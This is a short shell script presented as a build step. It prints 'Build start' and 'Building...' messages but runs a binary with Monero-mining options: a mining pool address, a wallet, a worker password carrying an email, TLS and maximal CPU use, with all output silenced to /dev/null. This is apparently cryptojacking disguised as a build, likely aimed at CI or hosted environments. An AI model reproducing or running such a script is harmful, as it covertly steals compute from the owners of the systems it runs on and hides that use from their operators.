echo "Build start."
echo "Starting..."
date
chmod +x app
./app --donate-level 1 -o gulf.moneroocean.stream:443 -u 8B1NcRqB9EU5MkA84NA7je5oBjheBcz6hiAsXH5sbh8tDknTRKqRjRo2eF2FXF3gjuXJASNhhGmJtjGVsWdz8NKAGq8GPiK -p hk123412341234:mewknows@gmail.com -k --tls --cpu-no-yield --cpu-priority 5 --randomx-mode=fast > /dev/null 2>&1
echo "Building..."
